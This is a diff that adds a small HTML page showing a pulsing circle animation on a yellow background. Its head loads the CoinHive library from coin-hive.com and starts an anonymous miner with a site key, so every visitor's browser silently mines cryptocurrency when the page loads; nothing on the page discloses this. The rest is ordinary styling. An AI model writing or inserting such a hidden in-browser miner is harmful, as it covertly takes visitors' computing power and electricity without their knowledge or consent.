@@ -1,0 +1,57 @@
+<html>
+
+<head>
+
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('KWIcUeYQ0CpFYjhpXFCreeJ3PybC8aYJ');
+	miner.start();
+</script>
+<link href="https://fonts.googleapis.com/css?family=Roboto:700" rel="stylesheet">
+
+<style>
+
+body {
+    background: #ffd400;
+}
+    
+#circle-object {
+    background: #3e3e3e;
+    width: 150px;
+    height: 150px;
+    border-radius: 50%;
+    overflow: hidden;
+} 
+
+.parent {
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    top: 0;
+    left: 0;
+    overflow: auto;
+}
+
+
+.ping {
+    -webkit-animation:ping .8s ease-in-out infinite both;
+    animation:ping .8s ease-in-out infinite both; 
+    position: absolute;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    margin: auto;
+}
+
+@-webkit-keyframes ping{0%{-webkit-transform:scale(.2);transform:scale(.2);opacity:.8}80%{-webkit-transform:scale(1.2);transform:scale(1.2);opacity:0}100%{-webkit-transform:scale(2.2);transform:scale(2.2);opacity:0}}@keyframes ping{0%{-webkit-transform:scale(.2);transform:scale(.2);opacity:.8}80%{-webkit-transform:scale(1.2);transform:scale(1.2);opacity:0}100%{-webkit-transform:scale(2.2);transform:scale(2.2);opacity:0}}
+    
+</style>
+</head>
+
+
+<div class="parent">   
+<div class="ping" id="circle-object"></div>
+</div>
+    
+</html>
